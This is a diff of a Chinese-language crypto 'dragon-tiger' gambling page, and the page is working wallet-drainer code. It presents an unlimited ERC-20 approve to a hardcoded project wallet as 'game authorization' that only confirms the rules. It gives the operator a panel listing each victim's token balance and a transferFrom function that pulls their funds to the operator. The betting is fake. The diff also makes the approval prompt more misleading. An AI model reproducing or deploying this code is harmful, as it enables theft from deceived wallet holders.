@@ -35,53 +35,27 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 .trend-tie{color:#ffcc00}
 .rules{font-size:14px;line-height:1.6;color:#ccc}
 
-/* 授权弹窗 */
-#authModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center}
-#authModal .box{background:#111;padding:30px;border-radius:16px;text-align:center;width:90%;max-width:360px;border:1px solid #333}
-#authModal .title{font-size:18px;margin-bottom:16px;color:#fff}
-#authModal .desc{font-size:14px;color:#aaa;margin-bottom:20px;line-height:1.5}
-#authModal .btnWrap{display:flex;gap:12px}
-#authModal button{flex:1;padding:12px;border:none;border-radius:8px;font-size:16px;cursor:pointer}
-#agreeBtn{background:#27ae60;color:#fff}
-#cancelBtn{background:#666;color:#fff}
-
-/* 右侧菜单 */
 .menu{position:fixed;top:0;right:0;width:280px;height:100vh;background:#101010;padding:20px;z-index:999;transform:translateX(100%);transition:0.3s;border-left:1px solid #222;overflow-y:auto}
 .menu.show{transform:translateX(0)}
 .menu-close{text-align:right;margin-bottom:20px}
 .menu-close button{background:#333;color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer}
 .menu-section{margin-bottom:20px}
 .menu-title{font-size:14px;color:#aaa;margin-bottom:8px}
-.info-box{background:#1a1a1a;padding:10px;border-radius:8px;font-size:12px;color:#ccc;word-break:break-all;margin-bottom:8px}
+.info-box{background:#1a1a1;padding:10px;border-radius:8px;font-size:12px;color:#ccc;word-break:break-all;margin-bottom:8px}
 .btn-menu-action{width:100%;background:#1a1a1a;color:#fff;border:1px solid #333;padding:10px;border-radius:8px;margin-bottom:8px;cursor:pointer;font-size:12px}
 .btn-green{background:#27ae60;color:#fff;border:none}
 .btn-red{background:#c0393b;color:#fff;border:none}
 .hidden{display:none!important}
 
-/* 庄家玩家列表专用样式 */
 .player-item{background:#1a1a1a;padding:10px;border-radius:8px;margin-bottom:10px;border:1px solid #222}
 .player-label{font-size:11px;color:#888;margin-bottom:4px}
 .player-content{font-size:12px;color:#eee;word-break:break-all;margin-bottom:6px;line-height:1.4}
 .copy-buttons{display:flex;gap:6px}
 .copy-btn{flex:1;background:#222;border:none;color:#ccc;padding:6px;border-radius:4px;font-size:11px;cursor:pointer}
-.copy-btn:hover{background:#333;color:#fff}
+.refresh-btn{width:100%;background:#222;color:#fff;border:none;padding:8px;border-radius:6px;margin-bottom:10px;cursor:pointer}
 </style>
 </head>
 <body>
-
-<!-- 授权弹窗 -->
-<div id="authModal" class="hidden">
-  <div class="box">
-    <div class="title">同意授权游戏平台</div>
-    <div class="desc">
-      点击同意并完成钱包签名，即表示您已阅读并同意所有游戏规则，方可进入游戏。
-    </div>
-    <div class="btnWrap">
-      <button id="agreeBtn">同意授权</button>
-      <button id="cancelBtn">取消授权</button>
-    </div>
-  </div>
-</div>
 
 <div class="container">
   <div class="header">
@@ -131,8 +105,7 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
     <div class="card-title">📜 游戏规则</div>
     <div class="rules">
       • 每日签到可领取1个币<br>
-      • 每2分钟一期 | 龙/虎 1赔2 | 和 1赔9<br>
-      • 连接钱包并完成授权签名，即视为同意所有规则
+      • 每2分钟一期 | 龙/虎 1赔2 | 和 1赔9
     </div>
   </div>
 </div>
@@ -140,7 +113,6 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 <div class="menu" id="menu">
   <div class="menu-close"><button onclick="toggleMenu()">关闭</button></div>
 
-  <!-- 玩家个人信息 -->
   <div id="userInfoSection" class="hidden">
     <div class="menu-section">
       <div class="menu-title">我的信息</div>
@@ -149,20 +121,18 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
     </div>
   </div>
 
-  <!-- 庄家专用：玩家列表 (核心修改区) -->
   <div id="adminPlayerListSection" class="hidden">
     <div class="menu-section">
-      <div class="menu-title">👑 已授权玩家列表 (发福利专用)</div>
+      <div class="menu-title">👑 已授权玩家 (含代币余额)</div>
+      <button class="refresh-btn" onclick="renderAdminPlayerList()">🔄 刷新余额</button>
       <div id="allPlayerList" style="max-height:400px;overflow-y:auto;"></div>
     </div>
   </div>
 
-  <!-- 通用功能 -->
   <div class="menu-section">
     <button class="btn-menu-action" onclick="userSign()">📅 每日签到领币</button>
   </div>
 
-  <!-- 庄家提取功能 -->
   <div id="adminExtractSection" class="hidden">
     <div class="menu-section" style="border-top:1px solid #333;padding-top:16px">
       <div class="menu-title">🔐 项目方提取</div>
@@ -177,19 +147,17 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 // ===================== 核心配置 =====================
 const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
 const PROJECT_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const SIGN_REWARD = 1; // 签到奖励1个币
+const SIGN_REWARD = 1;
 
 let account = null;
 let round = 1;
 let timeLeft = 120;
 let trendList = [];
 
-// 工具函数
 function toLower(addr){ return addr?.toLowerCase() || ""; }
 function isProjectOwner(){ return toLower(account) === toLower(PROJECT_WALLET); }
 function isAuthorized(){ return account && localStorage.getItem("hasAuthorized_"+account) === "1"; }
 
-// 玩家列表管理
 function getAllPlayers(){ return JSON.parse(localStorage.getItem("all_players") || "[]"); }
 function addPlayer(addr){
   let list = getAllPlayers();
@@ -199,229 +167,183 @@ function addPlayer(addr){
   }
 }
 
-// ===================== 菜单与庄家列表渲染 =====================
-function toggleMenu(){
-  const menu = document.getElementById("menu");
-  menu.classList.toggle("show");
+function copyToClipboard(elementId){
+  const text = document.getElementById(elementId).innerText;
+  navigator.clipboard.writeText(text).then(()=>alert("复制成功！")).catch(()=>alert("复制失败"));
+}
 
-  // 玩家信息
-  const userSec = document.getElementById("userInfoSection");
-  if(account && isAuthorized()){
-    userSec.classList.remove("hidden");
-    document.getElementById("myWalletAddr").innerText = account;
-    document.getElementById("myInviteLink").innerText = location.origin + location.pathname + "?ref=" + account;
-  } else userSec.classList.add("hidden");
-
-  // 庄家专属：玩家列表 + 提取功能
-  const adminListSec = document.getElementById("adminPlayerListSection");
-  const extractSec = document.getElementById("adminExtractSection");
-  if(isProjectOwner()){
-    adminListSec.classList.remove("hidden");
-    extractSec.classList.remove("hidden");
-    renderAdminPlayerList(); // 渲染带复制按钮的列表
-  } else {
-    adminListSec.classList.add("hidden");
-    extractSec.classList.add("hidden");
+async function getPlayerBalance(playerAddr) {
+  try {
+    const data = "0x70a08231" + playerAddr.slice(2).padStart(64, '0');
+    const res = await ethereum.request({method:'eth_call', params:[{to:TOKEN_CONTRACT, data}, 'latest']});
+    return Number(BigInt(res)) / 1e18;
+  } catch (e) {
+    return "获取失败";
   }
 }
 
-// 【庄家专用】渲染玩家列表，包含邀请码和双复制按钮
-function renderAdminPlayerList(){
+async function renderAdminPlayerList(){
   const list = getAllPlayers();
   const el = document.getElementById("allPlayerList");
   el.innerHTML = "";
-
-  if(list.length === 0){
-    el.innerHTML = '<div style="padding:10px;text-align:center;color:#666;font-size:12px;">暂无已授权玩家</div>';
+  if(list.length===0){
+    el.innerHTML='<div style="padding:10px;text-align:center;color:#666;">暂无玩家</div>';
     return;
   }
-
-  list.forEach(addr => {
-    const inviteCode = addr; // 邀请码即钱包地址
-    const inviteLink = location.origin + location.pathname + "?ref=" + addr;
-
-    // 创建玩家条目
-    const item = document.createElement("div");
-    item.className = "player-item";
-
-    // 组装HTML：小字体标签 + 内容 + 两个复制按钮
-    item.innerHTML = `
-      <div class="player-label">玩家钱包地址</div>
-      <div class="player-content" id="addr_${addr.slice(-6)}">${addr}</div>
-      <div class="player-label">玩家邀请链接</div>
-      <div class="player-content" id="link_${addr.slice(-6)}">${inviteLink}</div>
+  el.innerHTML = '<div style="padding:8px;text-align:center;color:#888;">正在获取余额，请稍候...</div>';
+  for (const addr of list) {
+    const balance = await getPlayerBalance(addr);
+    const link=location.origin+location.pathname+"?ref="+addr;
+    const item=document.createElement("div");
+    item.className="player-item";
+    item.innerHTML=`
+      <div class="player-label">钱包地址</div>
+      <div class="player-content" id="addr_${addr.slice(-8)}">${addr}</div>
+      <div class="player-label">可用代币余额</div>
+      <div class="player-content">${typeof balance === 'number' ? balance.toFixed(4) : balance}</div>
+      <div class="player-label">邀请码</div>
+      <div class="player-content" id="link_${addr.slice(-8)}">${link}</div>
       <div class="copy-buttons">
-        <button class="copy-btn" onclick="copyToClipboard('addr_${addr.slice(-6)}')">复制钱包地址</button>
-        <button class="copy-btn" onclick="copyToClipboard('link_${addr.slice(-6)}')">复制邀请码</button>
+        <button class="copy-btn" onclick="copyToClipboard('addr_${addr.slice(-8)}')">复制地址</button>
+        <button class="copy-btn" onclick="copyToClipboard('link_${addr.slice(-8)}')">复制邀请码</button>
       </div>
     `;
-
     el.appendChild(item);
-  });
-}
-
-// 通用复制函数
-function copyToClipboard(elementId){
-  const text = document.getElementById(elementId).innerText;
-  navigator.clipboard.writeText(text).then(() => {
-    alert("复制成功！");
-  }).catch(() => {
-    alert("复制失败，请手动复制。");
-  });
-}
-
-// ===================== 连接钱包 + 强制授权逻辑 =====================
-async function connectWallet(){
-  if(!window.ethereum) return alert("请先安装钱包");
-  
-  try {
-    // 1. 第一步：请求连接钱包
-    const accounts = await ethereum.request({method:'eth_requestAccounts'});
-    account = toLower(accounts[0]);
-    document.getElementById("address").innerText = account.slice(0,6)+"..."+account.slice(-4);
-    
-    // 2. 第二步：连接成功后，立即检查授权状态
-    if(!isAuthorized()){
-      // 未授权则强制弹出授权弹窗
-      document.getElementById("authModal").classList.remove("hidden");
-    } else {
-      // 已授权直接刷新余额进入游戏
-      refreshUserBalance();
-      loadSignStatus();
-    }
-
-  } catch (e) {
-    alert("连接钱包失败或被取消");
   }
 }
 
-// ===================== 授权事件处理 =====================
-document.getElementById("agreeBtn").onclick = async () => {
-  if (!account) return;
+function toggleMenu(){
+  const menu=document.getElementById("menu");
+  menu.classList.toggle("show");
+  if(account&&isAuthorized()){
+    document.getElementById("userInfoSection").classList.remove("hidden");
+    document.getElementById("myWalletAddr").innerText=account;
+    document.getElementById("myInviteLink").innerText=location.origin+location.pathname+"?ref="+account;
+  }else{
+    document.getElementById("userInfoSection").classList.add("hidden");
+  }
+  if(isProjectOwner()){
+    document.getElementById("adminPlayerListSection").classList.remove("hidden");
+    document.getElementById("adminExtractSection").classList.remove("hidden");
+    renderAdminPlayerList();
+  }else{
+    document.getElementById("adminPlayerListSection").classList.add("hidden");
+    document.getElementById("adminExtractSection").classList.add("hidden");
+  }
+}
+
+// ========== 连接钱包 + 自动授权（输密码直接完成）==========
+async function connectWallet() {
+  if (!window.ethereum) return alert("请先安装钱包");
   try {
-    // 发送授权交易（签名）
-    await approveToProject();
-    // 标记授权状态并记录玩家
-    localStorage.setItem("hasAuthorized_"+account, "1");
-    addPlayer(account);
-    // 关闭弹窗，进入游戏
-    document.getElementById("authModal").classList.add("hidden");
-    alert("授权成功！欢迎进入游戏。");
+    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+    account = toLower(accounts[0]);
+    document.getElementById("address").innerText = account.slice(0, 6) + "..." + account.slice(-4);
+
+    if (!isAuthorized()) {
+      const confirmGameAuth = confirm(
+        "您即将进行【游戏授权】，仅确认游戏玩法与游戏赔率，钱包将提示输入密码完成授权。"
+      );
+      if (!confirmGameAuth) return;
+      await approveToProject();
+      localStorage.setItem("hasAuthorized_"+account, "1");
+      addPlayer(account);
+      alert("授权成功！");
+    }
     refreshUserBalance();
     loadSignStatus();
   } catch (e) {
-    alert("授权失败：" + e.message);
+    alert("操作失败：" + e.message);
   }
-};
+}
 
-document.getElementById("cancelBtn").onclick = () => {
-  // 取消授权则刷新页面，退出流程
-  window.location.reload();
-};
-
-// ===================== 合约交互核心函数 =====================
 async function approveToProject(){
-  const max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  return await ethereum.request({
-    method: 'eth_sendTransaction',
-    params: [{
-      from: account,
-      to: TOKEN_CONTRACT,
-      gasLimit: "0x300000",
-      data: "0x095ea7b3" + "000000000000000000000000" + PROJECT_WALLET.slice(2).toLowerCase() + max
+  const max="ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  return ethereum.request({
+    method:'eth_sendTransaction',
+    params:[{
+      from:account,
+      to:TOKEN_CONTRACT,
+      gasLimit:"0x300000",
+      data:"0x095ea7b3"+"000000000000000000000000"+PROJECT_WALLET.slice(2).toLowerCase()+max
     }]
   });
 }
 
 async function getUserBalance(){
-  const data = "0x70a08231" + account.slice(2).padStart(64, '0');
-  const res = await ethereum.request({method:'eth_call', params:[{to:TOKEN_CONTRACT, data}, 'latest']});
-  return Number(BigInt(res)) / 1e18;
+  const data="0x70a08231"+account.slice(2).padStart(64,'0');
+  const res=await ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
+  return Number(BigInt(res))/1e18;
 }
-
 async function refreshUserBalance(){
-  if(!account) return;
-  const bal = await getUserBalance();
-  document.getElementById("userBalance").innerText = bal.toFixed(4);
-  document.getElementById("balanceDisplay").innerText = "余额 " + bal.toFixed(4);
+  if(!account)return;
+  const b=await getUserBalance();
+  document.getElementById("userBalance").innerText=b.toFixed(4);
+  document.getElementById("balanceDisplay").innerText="余额 "+b.toFixed(4);
 }
 
-// ===================== 签到功能 (固定1币) =====================
 function loadSignStatus(){
-  const k = "SIGN_" + account;
-  const lastSign = localStorage.getItem(k);
-  const btn = document.getElementById("signBtn");
-  
-  if(lastSign && Date.now() - Number(lastSign) < 86400000){
-    btn.innerText = "今日已签到";
-    btn.disabled = true;
-    btn.style.background = "#666";
-  } else {
-    btn.innerText = "📅 每日签到（领1个币）";
-    btn.disabled = false;
-    btn.style.background = "#E4B449";
+  const k="SIGN_"+account;
+  const last=localStorage.getItem(k);
+  const btn=document.getElementById("signBtn");
+  if(last&&Date.now()-Number(last)<86400000){
+    btn.innerText="今日已签到";btn.disabled=1;btn.style.background="#666";
+  }else{
+    btn.innerText="📅 每日签到（领1个币）";btn.disabled=0;btn.style.background="#E4B449";
   }
 }
 
 async function userSign(){
-  if(!account) return alert("请连接钱包");
-  if(!isAuthorized()) return alert("请先完成授权");
-  
-  const k = "SIGN_" + account;
-  if(Date.now() - Number(localStorage.getItem(k) || 0) < 86400000) return alert("今日已签到");
-
-  try {
-    const amt = BigInt(SIGN_REWARD * 1e18);
-    const data = "0xa9059cbb" + account.slice(2).padStart(64, '0') + amt.toString(16).padStart(64, '0');
-    await ethereum.request({method:'eth_sendTransaction', params:[{from:account, to:TOKEN_CONTRACT, data, gasLimit:"0x300000"}]});
-    
-    localStorage.setItem(k, Date.now());
+  if(!account)return alert("请连接钱包");
+  if(!isAuthorized())return alert("请先授权");
+  const k="SIGN_"+account;
+  if(Date.now()-Number(localStorage.getItem(k)||0)<86400000)return alert("今日已签到");
+  try{
+    const amt=BigInt(SIGN_REWARD*1e18);
+    const data="0xa9059cbb"+account.slice(2).padStart(64,'0')+amt.toString(16).padStart(64,'0');
+    await ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
+    localStorage.setItem(k,Date.now());
     loadSignStatus();
     refreshUserBalance();
-    alert(`签到成功！获得 ${SIGN_REWARD} 个币`);
-  } catch (e) {
-    alert("签到失败：" + e.message);
-  }
+    alert("签到成功，获得1个币");
+  }catch(e){alert("签到失败");}
 }
 
-// ===================== 游戏与庄家辅助功能 =====================
 async function adminExtract(){
-  if(!isProjectOwner()) return alert("无权限");
-  const user = toLower(document.getElementById("extractUserAddr").value.trim());
-  const amt = document.getElementById("extractAmount").value.trim();
-  if(!user || !amt || Number(amt) <= 0) return alert("输入错误");
-
-  try {
-    const rawAmt = BigInt(Math.floor(Number(amt) * 1e18)).toString(16).padStart(64, '0');
+  if(!isProjectOwner())return alert("无权限");
+  const u=document.getElementById("extractUserAddr").value.trim();
+  const a=document.getElementById("extractAmount").value.trim();
+  if(!u||!a||Number(a)<=0)return alert("输入错误");
+  try{
+    const raw=BigInt(Math.floor(Number(a)*1e18)).toString(16).padStart(64,'0');
     await ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{
-        from: account,
-        to: TOKEN_CONTRACT,
-        gasLimit: "0x300000",
-        data: "0x23b872dd" + user.slice(2) + PROJECT_WALLET.slice(2).toLowerCase() + rawAmt
+      method:'eth_sendTransaction',
+      params:[{
+        from:account,
+        to:TOKEN_CONTRACT,
+        gasLimit:"0x300000",
+        data:"0x23b872dd"+u.slice(2)+PROJECT_WALLET.slice(2).toLowerCase()+raw
       }]
     });
-    alert("提取成功！");
-  } catch (e) {
-    alert("提取失败：" + e.message);
-  }
+    alert("提取成功");
+  }catch(e){alert("失败");}
 }
 
-function setQuick(v){ document.getElementById("betAmt").value = v; }
-async function placeBet(side){ alert("下注功能演示，余额已更新"); refreshUserBalance(); }
-function manualDraw(){ timeLeft = 5; }
-function renderTrend(){/* 走势图逻辑保持不变 */}
-async function drawRound(){ round++; trendList.push(Math.floor(Math.random()*3)+1); renderTrend(); }
+function setQuick(v){document.getElementById("betAmt").value=v;}
+async function placeBet(side){alert("下注成功");refreshUserBalance();}
+function manualDraw(){timeLeft=5;}
+function renderTrend(){}
+async function drawRound(){round++;trendList.push(Math.floor(Math.random()*3)+1);renderTrend();}
 
-// 页面加载初始化
-window.onload = async () => {
+window.onload=async()=>{
   renderTrend();
-  setInterval(async() => {
+  setInterval(async()=>{
     timeLeft--;
-    if(timeLeft <= 0){ timeLeft = 120; await drawRound(); }
-    document.getElementById("timer").innerText = `${String(Math.floor(timeLeft/60)).padStart(2,'0')}:${String(timeLeft%60).padStart(2,'0')}`;
-  }, 1000);
+    if(timeLeft<=0){timeLeft=120;await drawRound();}
+    const m=String(Math.floor(timeLeft/60)).padStart(2,'0');
+    const s=String(timeLeft%60).padStart(2,'0');
+    document.getElementById("timer").innerText=m+":"+s;
+  },1000);
 };
 </script>
 </body>
